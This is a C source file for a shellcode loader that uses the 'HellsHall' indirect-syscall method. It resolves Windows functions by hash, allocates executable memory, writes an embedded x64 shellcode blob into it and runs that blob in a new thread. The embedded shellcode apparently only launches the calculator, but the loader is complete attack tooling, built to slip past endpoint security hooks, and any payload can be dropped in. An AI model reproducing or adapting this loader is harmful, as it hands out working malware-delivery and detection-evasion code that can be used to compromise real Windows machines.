#include <Core.h>
#include <Win32.h>
#include <Structs.h>
#include <HellsHall.h>


#define NtAllocateVirtualMemory_CRC32b  HASH("NtAllocateVirtualMemory")
#define NtWriteVirtualMemory_CRC32b  HASH("NtWriteVirtualMemory")
#define NtCreateThreadEx_CRC32b  HASH("NtCreateThreadEx")
SEC( text, B ) VOID Entry( VOID ) 
{
    
    unsigned char rawData[] = {
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
        0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
        0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
        0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
        0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
        0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
        0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
        0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
        0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
        0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
        0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
        0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
    };
    
    INSTANCE Instance = { };

    Instance.Modules.Kernel32   = LdrModulePeb( HASH_KERNEL32 ); 
    Instance.Modules.Ntdll      = LdrModulePeb( HASH_NTDLL ); 
    if ( Instance.Modules.Kernel32 != NULL )
    {
        // Load needed functions
        Instance.Win32.LoadLibraryA = LdrFunction( Instance.Modules.Kernel32, 0xb7072fdb );
        Instance.Win32.RtlSecureZeroMemory = LdrFunction (Instance.Modules.Ntdll, 0x7906a570);
        Instance.Modules.Msvcrt      = Instance.Win32.LoadLibraryA( GET_SYMBOL("msvcrt.dll") );
        Instance.Win32.printf = LdrFunction (Instance.Modules.Msvcrt, 0xc870eef8);
        
    }
    
    // ------ Code ------
    MyStruct S = { 0 };
    NTDLL       NtdllSt     = { 0 };
    SysFunc     sF          = { 0 };
    //Instance.Win32.RtlSecureZeroMemory(&S, sizeof(MyStruct));
    //Instance.Win32.RtlSecureZeroMemory(&NtdllSt, sizeof(NTDLL));
    //Instance.Win32.RtlSecureZeroMemory(&sF, sizeof(SysFunc));

	if (!InitilizeSysFunc(NtAllocateVirtualMemory_CRC32b, &NtdllSt, &sF))
    {
        Instance.Win32.printf("Error loading NtAllocateVirtualMemory");
		return FALSE;
    }
	getSysFuncStruct(&S.NtAllocateVirtualMemory, &sF);

	if (!InitilizeSysFunc(NtWriteVirtualMemory_CRC32b, &NtdllSt, &sF))
    {
        Instance.Win32.printf("Error loading  NtWriteVirtualMemory\n");
		return FALSE;
    }
	getSysFuncStruct(&S.NtWriteVirtualMemory, &sF);

	if (!InitilizeSysFunc(NtCreateThreadEx_CRC32b, &NtdllSt, &sF))
    {
        Instance.Win32.printf("Error loading  NtCreateThreadEx\n");
		return FALSE;
    }
	getSysFuncStruct(&S.NtCreateThreadEx, &sF);
    
    PVOID		pAddress	= NULL;
	SIZE_T		dwSize		= sizeof(rawData);
	DWORD		dwOld		= NULL;
    PULONG		NumberOfBytesWritten = NULL;
	HANDLE		hThread		= NULL;
	NTSTATUS	STATUS		= NULL;

    SetConfig(S.NtAllocateVirtualMemory.wSSN, S.NtAllocateVirtualMemory.pInst);
    if ((STATUS = HellHall((HANDLE)-1, &pAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) != 0x0) {
        Instance.Win32.printf("Yikes, status was %#x\n", STATUS); 
    }
    Instance.Win32.printf("Memory was allocated to 0x%llx\n", pAddress);
    
    SetConfig(S.NtWriteVirtualMemory.wSSN, S.NtWriteVirtualMemory.pInst);
    if ((STATUS = HellHall((HANDLE)-1, pAddress, rawData, dwSize, &NumberOfBytesWritten)) != 0x0) {
        Instance.Win32.printf("Yikes, status was %#x\n", STATUS); 
    }
    Instance.Win32.printf("Memory was written");

    SetConfig(S.NtCreateThreadEx.wSSN, S.NtCreateThreadEx.pInst);
    	if ((STATUS = HellHall(&hThread, 0x1FFFFF, NULL, (HANDLE)-1, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x0) {
		Instance.Win32.printf("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n", STATUS);
		return -1;
	}
    Instance.Win32.printf("Thread created??");
} 